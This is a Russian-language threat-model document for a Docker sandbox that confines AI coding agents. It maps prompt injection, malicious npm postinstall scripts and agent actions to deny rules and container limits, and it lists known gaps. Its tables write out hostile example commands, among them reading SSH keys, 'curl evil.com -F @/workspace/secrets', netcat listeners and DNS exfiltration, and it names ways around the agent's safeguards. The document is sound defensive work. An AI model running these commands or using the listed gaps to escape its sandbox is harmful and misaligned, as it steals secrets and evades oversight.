# AI Sandbox — модель угроз

Снимок состояния после итерации 2026-05-28. Описывает, **от кого**
sandbox защищает и **от кого нет**. Дополняет ARCHITECTURE.md (где
описаны слои защиты) со стороны атакующего.

## Кого защищаем

Хост-машину разработчика и его проекты. Конкретно:

- Файлы вне рабочего каталога проекта (`~/.ssh/`, `~/.aws/`, другие репо)
- Учётные данные на хосте (cookies браузера, keyring и т.п.)
- Целостность инфраструктуры разработки (cron, systemd, host packages)
- Конфиги самого sandbox внутри проекта (`run.sh`, `Dockerfile`,
  `settings.json`) — чтобы агент не мог снять с себя ограничения

Не защищаем:
- Данные **внутри** workspace проекта от изменения агентом — это его работа
- Прод-сервисы пользователя — это другая модель

## Кого боимся (актёры угроз)

| # | Актёр | Капабилити | Реалистичность |
|---|-------|-----------|----------------|
| A1 | **Скомпрометированная модель** Claude/Codex (zero-day, jailbreak) | Может пытаться выполнять произвольные команды через свои tools | Низкая, но не нулевая |
| A2 | **Prompt injection** через содержимое файлов проекта или web-fetch | Захват control flow модели через текст в input | **Высокая** — реальный вектор |
| A3 | **Malicious npm/pip-пакет**, установленный агентом по подсказке | Произвольный код при `npm install` / при импорте | Средняя — особенно для свежих/typo-squatted пакетов |
| A4 | **Сам пользователь, действующий неаккуратно** | Случайно дал ключ от прод-БД, запустил `rm -rf ~` | Высокая (главный реалистичный риск) |
| A5 | **Сетевой MITM** на пути к API | Перехват ключей в transit | Низкая (TLS + pinned hosts) |
| A6 | **Локальный многопользовательский хост** | Другой UID на машине читает мои файлы | Низкая для dev-машин |

Главные мишени: A2 (prompt injection) и A4 (пользовательская ошибка).
A1 (compromised model) обычно сводится к A2 — атакующий внедряет
инструкции в данные, которые модель прочитает.

## Цели атакующего

1. **Эксфильтрация секретов** — забрать API-ключи, SSH-ключи,
   credentials из браузера, исходники чужих проектов
2. **Persistence на хосте** — поставить cron, modify shell rc, добавить
   ssh-ключ
3. **Lateral movement** — использовать обнаруженные ключи для доступа
   к облачным сервисам пользователя
4. **Шантаж/destructive** — `rm -rf`, шифрование данных, удаление git
   истории
5. **Cryptomining / botnet** — использовать ресурсы хоста
6. **Эскалация привилегий внутри контейнера** — получить root, вырваться
   из user-ns

## Что покрыто (mapping атак → защита)

### A1/A2: модель пытается выполнить опасные команды

| Попытка | Что блокирует |
|---------|---------------|
| `Read("~/.ssh/id_rsa")` | `.claude/settings.json` deny на `~/.ssh/**`, `~/.aws/**`, `~/.gnupg/**`, `*.pem`, `*.key`, `.env*`, `secrets/**` |
| `Bash("sudo cat /etc/shadow")` | sudo не установлен в образе + `cap-drop=ALL` + deny `Bash(sudo *)` |
| `Bash("docker exec other-container bash")` | docker не установлен в образе + deny `Bash(docker *)` |
| `Edit("/workspace/.ai-sandbox/run.sh")` | RO bind-mount поверх rw `/workspace` + deny `Edit/Write(./.ai-sandbox/**)` |
| `Bash("curl evil.com -F @/workspace/secrets")` | В default/webfetch — `Bash(curl *)` deny. В offline — `--network=none`. В webfetch/dev — L7 hook резолвит `evil.com` против allowlist |
| `Bash("nc -lp 1234")` | `cap-drop=ALL` (нет CAP_NET_BIND_SERVICE для <1024) + deny `Bash(nc *)`, `socat *`, `ncat *` |
| `Bash("python3 -c 'import urllib.request; ...'")` | deny `Bash(python3 -c *urllib*)` (и аналогично requests, socket, http.client) |
| `WebFetch("https://evil.com")` | В default/offline — `WebFetch` deny. В webfetch/dev — net-guard.sh резолвит host против allowlist |
| `Bash("mv ~/.ssh ~/.ssh.bak")` | `~/.ssh/` не смонтирован в контейнер |
| `Bash("apt install something")` | `cap-drop=ALL` (нет CAP_DAC_OVERRIDE) + read-only rootfs |
| Fork-bomb | `--pids-limit 1024` |
| Memory exhaustion | `--memory 4g --memory-swap 4g` |
| CPU starvation | `--cpus 2` |

### A3: malicious npm-пакет

Атака: `npm install` ставит пакет, который в `postinstall` пытается
эксфильтрировать данные.

| Попытка пакета | Что блокирует |
|----------------|---------------|
| `curl evil.com` из postinstall | В default — postinstall запускается, но curl зарежется L7 hook'ом **только если** Claude его запустил через свой Bash tool. Если запустил пользователь напрямую `npm install` — hook не сработает. **В offline — отсечётся `--network=none`** |
| Чтение `/workspace/.env` | Deny на Claude-tools не действует на дочерние процессы npm. Зависит от того, что в `.env` хранится — sandbox не зашифровывает |
| Перезапись `/workspace/.ai-sandbox/run.sh` | RO bind-mount, защищён |
| Чтение `/home/sandbox/.codex/auth.json` | `.ai-sandbox/home/` доступен на запись/чтение пользователю — npm в контейнере под тем же UID имеет полный доступ. **Не защищено.** |

**Ключевой пробел:** sandbox защищает от того, что **Claude/Codex** делают
через свои tools, но **не** от кода, который запускается ими как
subprocess (npm postinstall, pip wheel, cargo build script). Это сознательный
компромисс — иначе sandbox был бы непригоден для реальной разработки.

Рекомендации пользователю:
- В default mode `--network=none` нельзя (нужны API-вызовы), но можно
  периодически использовать `--mode offline` для аудита/чтения без install
- Хранить настоящие production secrets вне рабочего каталога
- Использовать `npm install --ignore-scripts` где возможно

### A4: пользовательская ошибка

Главный риск, главная защита — это сам факт изоляции. Если пользователь
случайно подсунул prod-key или дал агенту "странную" задачу:

- Ключи в credentials.env видны контейнеру → используйте отдельные dev-ключи
- `~/.aws/credentials` не смонтирован → AWS CLI не работает из коробки
  (это **фича**, не баг)
- Любая команда `git push` идёт от UID хоста — изоляции от удалённых
  репозиториев нет, делается на уровне SSH/HTTPS вне sandbox

### A5: MITM

- Все API-вызовы по HTTPS через систему ca-certificates
- allowed-domains.txt — список *whom we contact*, не *who can MITM*; не
  защищает от перехвата в самой сети, только от communication с не-теми
  хостами
- Не сделано: pinning TLS-сертификатов конкретных хостов

### A6: эскалация в контейнере

| Попытка | Защита |
|---------|--------|
| `sudo -i` | sudo не установлен |
| `chmod +s /bin/something` | rootfs read-only |
| `mount` для перемонтирования fs | `cap-drop=ALL` (нет CAP_SYS_ADMIN) |
| Прокол user-namespace | --user соответствует host UID; user-ns не используется отдельно (sandboxed by Docker default) |
| Загрузка LKM | `cap-drop=ALL` (нет CAP_SYS_MODULE) |
| Запись в /proc/sys | `cap-drop=ALL` + read-only proc через no-new-privileges (частично) |
| Доступ к Docker socket | `/var/run/docker.sock` не смонтирован |

## Что НЕ покрыто (явные дыры)

### Сетевая эксфильтрация в режимах default/webfetch/dev/open

L7-hook применяется **только** к Claude tool calls. Любой процесс,
запущенный Claude через `Bash(<разрешённую команду>)` или Codex, или
пользователем через shell, может открыть произвольное сетевое соединение
в любом режиме кроме `offline`.

Например: `Bash("./build.sh")` где `build.sh` содержит `curl evil.com` —
hook видит `./build.sh`, проверяет хосты в строке (их нет), пропускает.
build.sh запускается, обращается куда хочет.

**Митigation:** использовать `--mode offline` для не-сетевых операций.
**Долгосрочный fix:** NET-01 в ROADMAP (sidecar firewall).

### Time-of-check vs time-of-use в L7 hook

Hook проверяет хосты в командной строке. Между проверкой и выполнением:
- Атакующий может изменить переменную окружения, к которой обращается curl
- DNS rebinding: разрешённый домен возвращает новый IP на повторный
  резолв; первый allowed, второй — evil

В практическом смысле это малорелевантно для AI-агента (нет
многошагового сценария), но формально атака есть.

### Содержимое workspace доступно полностью

`/workspace` смонтирован rw — агент видит всё в проекте, включая `.env`
файлы если они есть. `.claude/settings.json` запрещает их **читать**,
но это L1-permission, обходимая через `Bash(cat .env)` (cat не deny'нут).
**Сейчас** не deny'нут — стоит добавить `Bash(cat *.env)` в settings.json.

Поправка: уже частично покрыто через `Read(./.env*)`. Но Bash deny —
отдельный канал. См. ROADMAP §SEC-03 если этот вектор актуален.

### Persistence через `.ai-sandbox/home/`

Этот путь rw для процессов в контейнере. Атакующий код может:
- Положить shell-rc-trigger в `home/.bashrc`
- Подменить `home/.codex/auth.json` для будущего перехвата кредов

Митigation: при подозрении — `rm -rf .ai-sandbox/home/` и пересоздать.
RUNBOOK покрывает этот сценарий (см. OPERATIONS.md).

### Эксфильтрация через DNS

`offline` (--network=none) полностью блокирует. Остальные режимы — DNS
открыт. `nslookup evil-tracker.com` отправляет данные в имя поддомена,
которое попадает на authoritative nameserver. **Не блокируется.**

### Атаки на сам Docker daemon

Если атакующий получил root внутри контейнера через 0-day в Docker и
вырвался на host:
- `cap-drop=ALL` существенно усложняет
- `no-new-privileges` блокирует setuid
- Но это известный риск Docker; не защищаемся специально

### Боковые каналы (timing, cache)

В пределах одного контейнера возможна утечка через L1/L2 cache, TLB и
т.п. — не релевантно для нашей модели угроз.

### Supply chain атака на base image

Используется `node:22-bookworm-slim` с Docker Hub. Если этот образ
скомпрометирован — мы влипли. Митigation: `versions.env` пиннит major
node-версию, но не digest. Можно ужесточить: пиннить `@sha256:...`.

## Резюме

```
┌────────────────────────────────────────────────────────────┐
│ Защищено сильно:                                          │
│   - Прямые попытки агента читать host secrets             │
│   - Перезапись sandbox-конфигов                            │
│   - Расход ресурсов хоста                                  │
│   - Privesc внутри контейнера                              │
├────────────────────────────────────────────────────────────┤
│ Защищено частично:                                         │
│   - Сетевая эксфильтрация (только в offline или через L7) │
│   - Malicious npm postinstall (только в offline)          │
│   - Чтение .env через `cat` (через Read deny, но не Bash) │
├────────────────────────────────────────────────────────────┤
│ Не защищено:                                               │
│   - Эксфильтрация через произвольные сокеты вне offline   │
│   - DNS-эксфильтрация                                      │
│   - Долгоживущая persistence в .ai-sandbox/home/          │
│   - Supply-chain через base image / npm packages          │
└────────────────────────────────────────────────────────────┘
```

Хочется честно: sandbox даёт **разумное снижение** риска для AI-агента
с защитой от грубых атак, но **не** даёт hard-isolation как у KVM/Firecracker.
Для high-risk сценариев (анализ malware, untrusted code execution) этого
sandbox недостаточно — нужен отдельный VM или firecracker-VM.

Для типичного use-case (помощь с кодом в доверенном проекте, защита от
prompt injection и случайных ошибок) — этого достаточно.
